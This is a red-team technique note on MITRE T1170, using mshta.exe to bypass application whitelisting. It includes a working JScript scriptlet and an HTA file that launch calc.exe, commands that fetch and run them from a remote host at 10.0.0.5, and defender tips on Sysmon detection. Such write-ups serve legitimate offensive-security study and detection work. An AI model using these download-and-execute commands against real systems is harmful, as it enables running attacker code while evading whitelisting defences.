---
description: MSHTA code execution - bypass application whitelisting.
---

# T1170: MSHTA

## Execution

Writing a scriptlet file that will launch calc.exe when invoked:

{% code title="http://10.0.0.5/m.sct" %}
```markup
<?XML version="1.0"?>
<scriptlet>
<registration description="Desc" progid="Progid" version="0" classid="{AAAA1111-0000-0000-0000-0000FEEDACDC}"></registration>

<public>
    <method name="Exec"></method>
</public>

<script language="JScript">
<![CDATA[
	function Exec()	{
		var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
	}
]]>
</script>
</scriptlet>
```
{% endcode %}

Invoking the scriptlet file hosted remotely:

{% code title="attacker@victim" %}
```csharp
# from powershell
/cmd /c mshta.exe javascript:a=(GetObject("script:http://10.0.0.5/m.sct")).Exec();close();
```
{% endcode %}

## Observations

As expected, calc.exe is spawned by mshta.exe. Worth noting that mhsta and cmd exit almost immediately after invoking the calc.exe:

![](../../.gitbook/assets/mshta-calc.png)

As a defender, look at sysmon logs for mshta establishing network connections:

![](../../.gitbook/assets/mshta-connection.png)

Also, suspicious commandlines:

![](../../.gitbook/assets/mshta-commandline.png)

## Bonus

The hta file can be invoked like so:

```csharp
mshta.exe http://10.0.0.5/m.hta
```

![](../../.gitbook/assets/mshta-calc2.png)

or by navigating to the file itself, launching it and clicking run:

![](../../.gitbook/assets/mshta-url.png)

{% code title="http://10.0.0.5/m.hta" %}
```markup
<html>
<head>
<script language="VBScript"> 
    Sub RunProgram
        Set objShell = CreateObject("Wscript.Shell")
        objShell.Run "calc.exe"
    End Sub
RunProgram()
</script>
</head> 
<body>
    Nothing to see here..
</body>
</html>
```
{% endcode %}

## References

{% embed url="https://attack.mitre.org/wiki/Technique/T1170" %}

